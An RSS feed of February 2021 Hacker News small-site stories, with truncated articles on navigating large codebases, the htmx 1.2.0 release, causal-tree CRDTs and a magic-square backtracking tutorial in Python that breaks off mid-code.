<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 20]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 20. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 15 Feb 2021 20:29:23 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-20.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 15 Feb 2021 20:29:23 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[On Navigating a Large Codebase]]>
            </title>
            <description>
<![CDATA[
Score 130 | Comments 49 (<a href="https://news.ycombinator.com/item?id=26129190">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/ | <a href="https://web.archive.org/web/*/https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A while ago, I‚Äôve been working on a very large codebase that consisted of a few million lines of code.
Large systems are usually a big mess and this one was no exception.
Since this is a rather common problem in software engineering, I thought the internet would be
littered with stories about this topic.
There is a lot of talk about software carpentry, while software maintenance is rarely debated.
Either large programs are being maintained by dark matter developers or
nobody thinks that writing stories about large systems are interesting enough.</p><p>In the past I‚Äôve encountered a few of those large monsters and they seem to have a lot in common.
This article will try to present some of the problems and tricks that I am using when
I have to deal with them. Hopefully this will inspire others to write similar posts
and share tips from their own bag of tricks.</p><h2 id="large-codebase-problems">Large codebase problems</h2><p>The main problem of any large codebase is the extreme complexity that stems from the fact
that we live in a messy world of details that are very hard to describe and put into words.
The programming languages that we are using nowadays are still too primitive for that task,
and it takes a lot of lines and various layers of abstractions before we are able to convey the
rules of our world to the all mighty computer [1].</p><p>The following sections will present some of the common problems which I‚Äôve discovered during my
big system adventures.</p><p>A common trait of a large codebases is that at some point they become so large and bloated
that one person alone is no longer capable of understanding all its pieces. It seems to
me that after 100‚Äô000 lines of code, the maintenance related problems start to appear
as the complexity of the code simply dwarfs the capabilities of the human brain.
Such large systems are commonly maintained by more than one person, but with a large
group of people also come large organizational problems.</p><p>Within a large group of people the number of possible communication paths between them go bananas
and so it often happens that the ass no longer knows what the head is doing.
This misunderstanding in turn cause them to build the wrong thing that doesn‚Äôt fit
into the rest of the system. You might also know this situation under the term of
‚Äúthose people had no idea what they were doing, and we will do it right this time‚Äù which is
quite often floating around in the latest maintenance team.</p><p>That rarely happens though, because it‚Äôs likely the Towel of Babel situation all over again.</p><h3 id="loss-of-knowledge">Loss of knowledge</h3><p>Large systems are usually maintained by the ones who did not build them. Initial
developers often leave the company or move up in the pecking order to
work on other projects and are therefore no longer familiar with the system.
Sometimes the bright minds outsourced the initial development of the project
in the name of lowering the costs, just to pay tenfold in the later stages once they realize
the outsourcers developed the wrong thing. Even worse is the fact that the in house developers
didn‚Äôt gain the internal domain knowledge that is necessary for further maintenance of the system.</p><p>This presents a big problem for the new maintainers, as they can‚Äôt just go
around the company and ask the original developers about the initial design decisions.
Learning this tribal knowledge usually takes a lot of time, because the code is harder to read and
understand than it is to write. These days most developers seem to switch jobs every 2 to 3 years,
therefore the learning process has to be constantly going on, otherwise you might end up
with a large and expensive monster that nobody knows anything about [2].
For most of the past large projects on which I‚Äôve been working on, the team has usually
changed by the end of the first version.</p><p>Rigorously documenting every step is not the cure for this problem, because at some point all that
junk will become outdated and nobody will have the time to spend a year just reading the
documentation and figuring out how the pieces fit together [3].</p><h3 id="lack-of-knowledge">Lack of knowledge</h3><p>Large systems become large, because they are usually trying to solve every problem under the sun.
Often the organization that is embarking on such journey does not have enough experienced
employees on board to actually pull it off. Some like to say that pressure makes diamonds,
but sometimes it also crushes the things that are under.</p><p>It‚Äôs fine to have less experienced people working on a large system as long as they have the elders
overseeing their work. In the world where senior titles are handed left and right,
that is often not the case and it‚Äôs how you end up with a very fragile system that is suitable for
a replacement as soon as it was built. Most of the larger projects that I was working on and
were considered successes, had the core parts of the system written by experienced
developers. A significant chunks were also built by greenhorns, but they were usually
guided and their blast radius was limited to the less complex parts of the system.</p><h3 id="the-astronauts">The astronauts</h3><p>Big projects tend to attract the data modelers and other cultists who like to
get in the way of getting shit done. These architecture astronauts will endlessly
discuss the finer points of their UML data models and multithreaded layers of abstraction,
that will one day allow them to be the heroes of their own story by writing some well
encapsulated and ‚ÄúSOLID‚Äù code.</p><blockquote><p>Why IBM sales reps don‚Äôt have children?</p><p>Because all they do is sit on the bed telling their spouses how great it‚Äôs going to be.</p></blockquote><p>Meanwhile, the for loopers have to fight this creeping metadata bureaucracy
madness on a daily basis. The tools handed down to them from the ivory tower usually don‚Äôt stand
the heat of the battle, but that doesn‚Äôt bother the modelers who will try to fix
the problems with more obfuscation patterns. It‚Äôs how you end with a homebrewed middleware monstrosity,
because the 100 existing ones out there are obviously not up to the task of powering our little CRUD app.</p><h3 id="documentation-problems">Documentation problems</h3><blockquote><p>I like to keep documentation separated from the code. Who am I?</p><p>A fool, with an out of sync document.</p></blockquote><p>The documentation of any large system is almost always outdated.
The code is usually changing faster due to the endless edge cases of the system
that were not being thought of early on. The discovered edge case problems are
usually fixed by bolting additional functionality right on the spot.
The average code change of such patch is usually quite small,
but a few tweaks here and there accumulate over time until the original design no
longer matches with the reality.</p><p>Tweaking the code is usually simple as most people are familiar with the process. You pull the
code from the version control, you make your tweaks and then you push it back.
On the other hand updating the documentation is way more convoluted and usually involves the
whole ceremony, because the term documentation is actually a spaghetti of Word documents,
pdfs, spreadsheets, emails, wiki pages and some text files on some dude‚Äôs hard drive.</p><p>The corporate world still loves to use MS Word for writing technical documents, even though
it‚Äôs entirely unusable for this use case. The Word doesn‚Äôt support syntax highlighting for
code snippets and you get to play the game of ‚Äúmoving one image for 5 pixels to the
left will mess with your headings and right align all text.‚Äù
It also makes it very hard to have multiple people collaborating on the same document.
The version control still treats Word documents in the same way as binary blobs,
which makes merging changes and fixing merge conflicts far harder than it should be.
I still remember how people collaborated by working each on their own copy of the
document and having a documentation officer merging all the copies together
manually to avoid any merge conflicts. Fun times.</p><p>If you are lucky, you might be writing documentation in plain text, but then you may have to
get familiar with all kinds of weird Lovecraftian toolchains that are relying on
all sorts of ancient operating system specifics in order to produce a nicer looking document.</p><p>After all these years of progress, writing documentation is still an unpleasant process
due to all the pain surrounding the tools that we have to deal with on a daily basis.
Large projects ensure that not only is the documentation hard to write, it‚Äôs also
impossible to find and read due to the sheer number of documents [4].</p><h2 id="tackling-the-beast">Tackling the beast</h2><p>In this section I will describe my ways of tackling the problems of an unknown large codebase
that I often encounter in the wild.
As mentioned before, the main problem of large systems is that nobody can understand them
entirely and often you will be left wondering how the damn thing even works.</p><p>When you are trying to understand a specific part of a large system, it‚Äôs worth
taking the time to talk to the current maintainers. They usually know it well enough
to guide you through the jungle, so you can avoid the traps and get up to speed faster.
Sometimes you will encounter a situation where you will just have to figure it
out on your own, because nobody will have the answers to your questions.</p><p>Hopefully the following sections might give you some ideas on how to tackle such
situations.</p><h3 id="read-the-documentation">Read the documentation</h3><p>The easiest way to get familiar with a large system, is by going through its documentation and
actually reading it. Large systems usually contain
large swaths of outdated documentation, but even a slightly outdated document is
often better than not having it at all. Ask the elders about the current state of documentation,
so you don‚Äôt completely waste your time with deciphering the irrelevant documents.</p><p>Either way, the documentation will only give you an overview of the system. The details
behind design decisions are almost never mentioned and you will have to find another way.</p><h3 id="check-the-tests">Check the tests</h3><p>When I am trying to decipher how a specific part of the system is supposed to behave,
I usually check for tests. If they exist, you might want to scroll through them and hopefully
you will get another ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</a></em></p>]]>
            </description>
            <link>https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129190</guid>
            <pubDate>Sun, 14 Feb 2021 02:41:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Htmx 1.2.0 Release]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26128229">thread link</a>) | @crbelaus
<br/>
February 13, 2021 | https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/ | <a href="https://web.archive.org/web/*/https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.2.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.2.0/">1.2.0 release</a> of htmx.</p>
<h3>New Features &amp; Major Changes</h3>
<ul>
<li><code>hx-vars</code> has been deprecated in favor of <code>hx-vals</code></li>
<li><code>hx-vals</code> now supports a <code>javascript:</code> prefix to achieve the behavior that <code>hx-vars</code> provided</li>
<li>The new <code>hx-headers</code> attribute allows you to add headers to a request via an attribute.  Like <code>hx-vals</code> it supports
JSON or javascript via the <code>javascript:</code> prefix</li>
<li><code>hx-include</code> will now include all inputs under an element, even if that element is not a form tag</li>
<li>The <a href="https://htmx.org/extensions/preload/">preload extension</a> now offers a <code>preload-images="true"</code> attribute that will aggressively load images in preloaded content</li>
<li>On requests driven by a history cache miss, the new <code>HX-History-Restore-Request</code> header is included so that the server
can differentiate between history requests and normal requests</li>
</ul>
<h3>Improvements &amp; Bug fixes</h3>
<ul>
<li>Improved handling of precedence of input values to favor the enclosing form (see <a href="https://github.com/bigskysoftware/htmx/commit/a10e43d619dc340aa324d37772c06a69a2f47ec9">here</a>)</li>
<li>Moved event filtering logic <em>after</em> <code>preventDefault</code> so filtering still allows events to be properly handled</li>
<li>No longer trigger after swap events on elements that have been removed via an <code>outerHTML</code> swap</li>
<li>Properly remove event handlers added to other elements when an element is removed from the DOM</li>
<li>Handle the <code>scroll:</code> modifier in <code>hx-swap</code> properly when an <code>outerHTML</code> swap occurs</li>
<li>Lots of docs fixes</li>
</ul>
<p>Enjoy!</p>

</div></div>]]>
            </description>
            <link>https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128229</guid>
            <pubDate>Sat, 13 Feb 2021 23:51:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Laced with History: Causal Trees and Operational CRDTs (2018)]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26127570">thread link</a>) | @mcovalt
<br/>
February 13, 2021 | http://archagon.net/blog/2018/03/24/data-laced-with-history/ | <a href="https://web.archive.org/web/*/http://archagon.net/blog/2018/03/24/data-laced-with-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div id="sel_blog20180324data-laced-with-history">
<div>



<article>


<p><img src="http://archagon.net/images/blog/causal-trees/header.jpg"></p>

<p>Hello! This article took a while to cobble together. If you find it useful, please consider leaving a donation via <a href="https://donorbox.org/crdt-article"> </a>, <a href="https://www.buymeacoffee.com/archagon"> </a>, or <a href="ethereum:0x0d5dd8a8Cca8Bf7d0122F7A1Cc76c6b0666fCC56"> </a>. (Thought I'd try something new!) Or, just buy yourself a nice Roost through my <a href="http://amzn.to/2D7uYxz"> </a>. Donation or not, thank you for reading! üòä</p>

<p>(Sorry about the length! At some point in the distant past, this was supposed to be a short blog post. If you like, you can skip straight to the <a href="#demo-concurrent-editing-in-macos-and-ios">demo section</a> to get a sense of what this article is about.)</p>

<p>Embarrassingly, most of my app development to date has been confined to local devices. Programmers like to gloat about the stupendous mental castles they build of their circuitous, multi-level architectures, but not me. In truth, networks leave me quite perplexed. I start thinking about data serializing to bits, servers performing their arcane handshakes and voting rituals, merge conflicts pushing into app-space and starting the whole process over again‚Äîand it all just turns to mush in my head. For peace of mind, my code needs to be <em>locally provable</em>, and this means things like idempotent functions, decoupled modules, contiguous data structures, immutable objects. Networks, unfortunately, throw a giant wrench in the works.</p>

<p>Sometime last year, after realizing that most of my document-based apps would probably need to support sync and collaboration in the future, I decided to finally take a stab at the problem. Granted, there were tons of frameworks that promised to do the hard work of data model replication for me, but I didn‚Äôt want to black-box the most important part of my code. My gut told me that there had to be some arcane bit of foundational knowledge that would allow me to sync my documents in a refined and functional way, decoupled from the stateful spaghetti of the underlying network layer. Instead of downloading a Github framework and <a href="http://amzn.to/2iigBOI">smacking the build button</a>, I wanted to develop a base set of skills that would allow me to easily network <em>any</em> document-based app in the future, even if I was starting from scratch.</p>

<!--more-->

<p>The first order of business was to devise a wishlist for my fantastical system:</p>

<ul>
  <li>Most obviously, users should be able to edit their documents immediately, without even touching the network. (In other words, the system should only require <em>optimistic concurrency</em>.)</li>
  <li>Sync should happen in the background, entirely separate from the main application code, and any remote changes should be seamlessly integrated in real-time. (The user shouldn‚Äôt have to notice that the network is down.)</li>
  <li>Merge should always be automatic, even for concurrent edits. The user should never be faced with a ‚Äúpick the correct revision‚Äù dialog box.</li>
  <li>A user should be able to work on their document offline for an indefinite period of time without accruing ‚Äúsync debt‚Äù. (Meaning that if, for example, sync is accomplished by sending out mutation events, performance should not suffer even if the user spends a month offline and then sends all their hundreds of changes at once.)</li>
  <li>Secondary data structures and state should be minimized. Most of the extra information required for sync should be stored in the same place as the document, and moving the document to a new device should not break sync. (No out-of-band metadata or caches!)</li>
  <li>Network back-and-forth should be condensed to a bare minimum, and rollbacks and re-syncs should practically never happen. To the greatest possible degree, network communication should be stateless and dumb.</li>
  <li>To top it all off, my chosen technique had to pass the ‚ÄúPhD Test‚Äù. That is to say, one shouldn‚Äôt need a PhD to understand and implement the chosen approach for custom data models!</li>
</ul>

<p>After mulling over my bullet points, it occurred to me that the network problems I was dealing with‚Äîbackground cloud sync, editing across multiple devices, real-time collaboration, offline support, and reconciliation of distant or conflicting revisions‚Äîwere all pointing to the same question: was it possible to design a system where any two revisions of the same document could be merged deterministically and sensibly without requiring user intervention? Sync, per se, wasn‚Äôt the issue, since getting data from one device to another was essentially a solved problem. It‚Äôs what happened <em>after</em> sync that was troubling. On encountering a merge conflict, you‚Äôd be thrown into a busy conversation between the network, model, persistence, and UI layers just to get back into a consistent state. The data couldn‚Äôt be left alone to live its peaceful, functional life: every concurrent edit immediately became a cross-architectural matter. On the other hand, if two documents could always be made to merge, then most of that coordination hullabaloo could go out the window. Each part of the system could be made to work at its own pace.</p>

<p>Whether stored as a record in a database or as a stand-alone file, a document could be interpreted as a collection of basic data fields: registers, sequences, dictionaries, and so forth. Looking at the problem from a database perspective, it was actually quite simple to automatically resolve merge conflicts in this kind of table row: just keep overwriting each field with the version sporting the highest timestamp, <a href="https://en.wikipedia.org/wiki/Lamport_timestamps">logical</a> or otherwise. (Ignoring issues of inter-field consistency for now.) Of course, for anything other than basic registers, this was a terrible approach. Sequences and dictionaries weren‚Äôt just blobs of homogeneous data that were overwritten with every change, but complex, mutable structures that users were editing on a granular level. For such a fundamental problem, there was a surprising dearth of solutions out in the real world: most systems punted the task to app-space by asking the client to manually fix any merge conflicts or pick the correct version of a file. It seemed that if the problem of automatic merge for non-trivial data types could be solved‚Äîperhaps by exposing their local, type-specific mutation vocabulary to the storage and replication layers?‚Äîthen a solution to the higher-level problem of automatic document merge would fall within reach.</p>

<p>In hope of uncovering some prior art, I started by looking at the proven leader in the field, Google Docs. Venturing down the deep rabbit hole of <a href="https://en.wikipedia.org/wiki/Collaborative_real-time_editor">real-time collaborative editing</a> techniques, I discovered that many of the problems I faced fell under the umbrella of <a href="https://en.wikipedia.org/wiki/Eventual_consistency">strong eventual consistency</a>. Unlike the more conventional <a href="https://en.wikipedia.org/wiki/Strong_consistency">strong consistency</a> model, where all clients receive changes in identical order and rely on locking to some degree, strong <em>eventual</em> consistency allows clients to individually diverge and then arrive at a final, consistent result once each update has been received. (Or, in a word, when the network is <em>quiescent</em>.)</p>

<p>There were a number of tantalizing techniques to investigate, and I kept several questions in mind while doing my analysis. Could a given technique be generalized to arbitrary and novel data types? Did the technique pass the PhD Test? And was it possible to use the technique in an architecture with smart clients and dumb servers?</p>

<p>The reason for that last question was CloudKit Sharing, a framework introduced in iOS 10. For the most part, this framework functioned as a superset of regular CloudKit, requiring only minor code changes to enable document sharing in an app. A developer didn‚Äôt even have to worry about connecting users or dealing with UI: Apple did most of the hard work in the background while leveraging standard system dialogs. But almost two years later, <a href="https://github.com/search?l=Swift&amp;q=UICloudSharingController&amp;type=Code&amp;utf8=%E2%9C%93">on the order of no one</a> seemed to be using it. Why was this? Most other Apple APIs tended to be readily adopted, especially when they allowed the developer to expand into system areas which were normally out of bounds.</p>

<p>My hunch was that CloudKit Sharing forced the issue of real-time collaboration over a relatively dumb channel, which was a task outside the purview of conventional sync approaches. CloudKit allowed developers to easily store, retrieve, and listen for new data, but not much else besides. No third-party code was allowed to run on Apple‚Äôs servers, so merge conflicts had to be handled locally. But unlike in the single-user case, which presented limited opportunities for concurrent edits, you couldn‚Äôt just pop up a merge dialog every time another participant in your share made a change to your open document. The only remaining options seemed to be some sort of ugly, heuristic auto-merge or data-dropping last-write-wins, neither of which was acceptable for real-time use. Collaboration along the lines of Google Docs appeared to be impossible using this system! But was it really?</p>

<p>I realized that this was my prize to be won. If I could figure out a way to develop auto-merging documents, I‚Äôd be able to implement sync and collaboration in my apps over CloudKit while using Apple‚Äôs first-party sharing UI‚Äîall without having to pay for or manage my own servers. So this became my ultimate research goal: a collaborative iPhone text editing demo that synced entirely over CloudKit. (And here‚Äôs a spoiler: <a href="#demo-concurrent-editing-in-macos-and-ios">it worked!</a>)</p>





<p>There are a few basic terms critical to understanding eventual consistency. A network is comprised of <em>sites</em> (‚Äúdevices‚Äù, ‚Äúpeers‚Äù) operating in parallel, each one producing <em>operations</em> (‚Äúevents‚Äù, ‚Äúactions‚Äù) that mutate the data and exchange information with other sites. The first vital concept here is <strong>causality</strong>. An operation is <em>caused</em> by another operation when it directly modifies or otherwise involves the results of that operation, and determining causality is critical to reconstructing a sensible timeline (or <strong>linearization</strong>) of operations across the network. (An operation that <em>causes</em> another operation must always be ordered first.) However, we can‚Äôt always determine direct causality in a general way, so algorithms often assume that an operation is causally ahead of another one if the site generating the newer operation has already seen the older one at the time of its creation. (In other words, every operation already seen by a site at the time a new operation is created is in that operation‚Äôs <em>caus‚Ä¶</em></p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://archagon.net/blog/2018/03/24/data-laced-with-history/">http://archagon.net/blog/2018/03/24/data-laced-with-history/</a></em></p>]]>
            </description>
            <link>http://archagon.net/blog/2018/03/24/data-laced-with-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127570</guid>
            <pubDate>Sat, 13 Feb 2021 22:25:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Bestsnip ‚Äì Draw animations online with automatic inbetweening]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26126906">thread link</a>) | @nevernothing
<br/>
February 13, 2021 | https://bestsnip.com/animation/ | <a href="https://web.archive.org/web/*/https://bestsnip.com/animation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://bestsnip.com/animation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126906</guid>
            <pubDate>Sat, 13 Feb 2021 21:05:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Solving Magic Squares Using Backtracking]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26126652">thread link</a>) | @jpskycak
<br/>
February 13, 2021 | http://www.eurisko.us/solving-magic-squares-using-backtracking/ | <a href="https://web.archive.org/web/*/http://www.eurisko.us/solving-magic-squares-using-backtracking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><!--<p class="page__meta"><i class="fa fa-clock-o" aria-hidden="true"></i> 12 minute read</p>--> <!--<p class="page__meta"><time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p>--><p>By <a target="_blank" href="https://eurisko-us.github.io/elijah-tarr">Elijah Tarr</a> on <time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p><!--<p class="page__date"><strong><i class="fa fa-fw fa-calendar" aria-hidden="true"></i> Published:</strong> <time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p>--></header><section itemprop="text"><div><p>A magic square can be thought of as a matrix with specific rows, columns, and diagonals adding up to the same number, called the magic constant. For an $n \times n$ magic square, the magic constant is</p><center> $\begin{align*} \dfrac{1}{n} \sum_{k=1}^{n^2} k \end{align*}$ </center><p>For example, a magic square with dimensions $3 \times 3$ would have magic constant $15,$ and dimensions $4 \times 4$ would have magic constant $34.$</p><p>To solve a magic square, we must fill in each element with a number in ${1, 2, \ldots, n^2 },$ and each number must appear exactly once. A $3 \times 3$ magic square could look like this:</p><center> $\begin{align*} \begin{bmatrix} 2 &amp; 7 &amp; 6 \\ 9 &amp; 5 &amp; 1 \\ 4 &amp; 3 &amp; 8 \end{bmatrix} \end{align*}$ </center><p>Or this:</p><center> $\begin{align*} \begin{bmatrix} 8 &amp; 3 &amp; 4 \\ 1 &amp; 5 &amp; 9 \\ 6 &amp; 7 &amp; 2 \end{bmatrix} \end{align*}$ </center><p>It may seem like a $3 \times 3$ magic square can have multiple solutions. But looking closer allows us to see that the two matrices above are actually both the same configuration. The second matrix is just the first matrix rotated $180$ degrees. In general, rotating and flipping a magic square in any direction will still yield a valid magic square.</p><h2>Solving a Magic Square Using Brute Force</h2><p>How can we build a program to construct one of these magic squares?</p><p>Just like every problem, the simplest way to solve a magic square is to use brute force. It will be the most inefficient solution we can think of, but it will give us some grounding to see which areas we need to improve it in. To get some code down, we can write something like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>():
    <span>for</span> x1 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
        <span>for</span> x2 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
            <span>for</span> x3 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                <span>for</span> x4 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                    <span>for</span> x5 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                        <span>for</span> x6 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                            <span>for</span> x7 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                <span>for</span> x8 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                    <span>for</span> x9 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                        square <span>=</span> [[x1, x2, x3],
                                                  [x4, x5, x6],
                                                  [x7, x8, x9]]
                                        <span>if</span> is_valid(square, <span>15</span>):
                                            <span>return</span> square
</pre></div></span></p><p>The classic $9$-nested-for-loop approach. It is quite inefficient, but it will do the job. Each $x_k$ variable represents a space in the square. There are 9 spaces, so we nest $9$ loops, $1$ for each space. Each loop will loop through all the possible numbers in that space, $1$ through $9.$</p><p>To write the <code>is_valid</code> function, we need to check for duplicate values, which can easily be done with the use of a set. Then we have to check if each row, column, and diagonal adds up to a certain number, so we can just make a list of all those and check if they are equal to $15$ at the end.</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>is_valid</span>(square, n):
    vals <span>=</span> [entry <span>for</span> row <span>in</span> square <span>for</span> entry <span>in</span> row <span>if</span> entry <span>!=</span> <span>None</span>]
    <span>if</span> <span>len</span>(<span>set</span>(vals)) <span>&lt;</span> <span>len</span>(vals): <span># check for duplicates</span>
        <span>return</span> <span>False</span>
        
    num_rows <span>=</span> <span>len</span>(square)
    arrs <span>=</span> square \ <span># rows</span>
        <span>+</span> [<span>list</span>(arr) <span>for</span> arr <span>in</span> <span>zip</span>(<span>*</span>square)] \ <span># columns</span>
        <span>+</span> [square[i][i] <span>for</span> i <span>in</span> <span>range</span>(<span>len</span>(square))] <span># main diagonal</span>
        <span>+</span> [square[i][num_rows<span>-</span>i<span>-</span><span>1</span>] <span>for</span> i <span>in</span> <span>range</span>(num_rows)] <span># anti-diagonal</span>
        
    <span>return</span> <span>all</span>(<span>sum</span>(arr) <span>==</span> n <span>for</span> arr <span>in</span> arrs <span>if</span> <span>None</span> <span>not</span> <span>in</span> r)
</pre></div></span></p><p>Because I want this function to be able to run on squares larger than just $3 \times 3,$ I pass in the constant as $n$. For a $3 \times 3$ square, we would set $n=15.$ For a $4 \times 4$ square, we would set $n=34.$</p><h2>Brute Force Takes Forever!</h2><p>Let‚Äôs talk about timing. We have $9$ nested for loops, and the <code>is_valid</code> operation is in the deepest one. Since each loop is going to run $9$ times to test each number $1-9$ in each element of the square, it‚Äôs going to run the <code>is_valid</code> function $9^9$ times, which is absolutely insane.</p><p>Using Python‚Äôs <code>timeit</code> module, we can see how long the <code>is_valid</code> function takes to run:</p><ul><li>$1.6 \, \mu\textrm{s}$ to run if there are duplicate values</li><li>$5.3 \, \mu\textrm{s}$ to run if there are no duplicate values</li><li>$6.3 \, \mu\textrm{s}$ to run if the square is valid</li></ul><p>With this brute force algorithm, we can expect that the vast majority of iterations are going to have duplicate values in them. So, I‚Äôll be generous and say that each time it runs, $1.6 \, \mu\textrm{s}$ pass. That means the amount of time it takes is $9^9 \times 1.6 \textrm{ usecs} \sim 10.3 \textrm{ minutes}.$</p><p>What if we wanted a $4 \times 4$ magic square? Well, we can use the equation again: $16^{16} \times 1.6 \mu\textrm{s} \sim \textbf{600 millennia}.$ It‚Äôs very unlikely that the human race will even exist for that long; we might have destroyed the earth along with the computer that was running this algorithm by then. We need to write a more efficient algorithm.</p><h2>Backtracking</h2><p>The problem with brute force is that it spends too much time looking through solutions that will never work. For example, the algorithm starts out with the square</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 1 \end{bmatrix}, \end{align*}$ </center><p>and then advances to</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 2 \end{bmatrix}, \end{align*}$ </center><p>and then</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 3 \end{bmatrix}. \end{align*}$ </center><p>There‚Äôs absolutely no point in checking any square with the first $3$ numbers as $1$ because we‚Äôre not allowed to have duplicates.</p><p>To avoid configurations like $1,1,1$ as the top row, we can use a technique called <b>backtracking</b>. Whenever we reach a configuration that won‚Äôt work, we ‚Äúbacktrack‚Äù and skip over that configuration instead of wasting tons of time modifying it in ways that will never make it valid.</p><p>Using backtracking, we would skip over all configurations that have duplicates, and instead start out with</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 2 &amp; 3\\ 4 &amp; 5 &amp; 6 \\ 7 &amp; 8 &amp; 9 \end{bmatrix}. \end{align*}$ </center><p>To implement backtracking, we‚Äôll start by skipping over configurations with duplicates. In each for loop, before entering the next loop, we will check if the number has been duplicated anywhere. We will only check the rest of the square if the number isn‚Äôt duplicated. Implementing this, we end up with the following code:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>()
    <span>for</span> x1 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
        <span>for</span> x2 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
            <span>if</span> x2 <span>in</span> [x1]:
                <span>continue</span>
            <span>for</span> x3 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                <span>if</span> x3 <span>in</span> [x1, x2]:
                    <span>continue</span>
                <span>for</span> x4 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                    <span>if</span> x4 <span>in</span> [x1, x2, x3]:
                        <span>continue</span>
                    <span>for</span> x5 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                        <span>if</span> x5 <span>in</span> [x1, x2, x3, x4]:
                            <span>continue</span>
                        <span>for</span> x6 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                            <span>if</span> x6 <span>in</span> [x1, x2, x3, x4, x5]:
                                <span>continue</span>
                            <span>for</span> x7 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                <span>if</span> x7 <span>in</span> [x1, x2, x3, x4, x5, x6]:
                                    <span>continue</span>
                                <span>for</span> x8 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                    <span>if</span> x8 <span>in</span> [x1, x2, x3, x4, x5, x6, x7]:
                                        <span>continue</span>
                                    <span>for</span> x9 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                        <span>if</span> x9 <span>in</span> [x1, x2, x3, x4, x5, x6, x7, x8]:
                                            <span>continue</span>
                                        square <span>=</span> [[x1, x2, x3],
                                                  [x4, x5, x6],
                                                  [x7, x8, x9]]
                                        <span>if</span> is_valid(square, <span>15</span>):
                                            <span>return</span> square
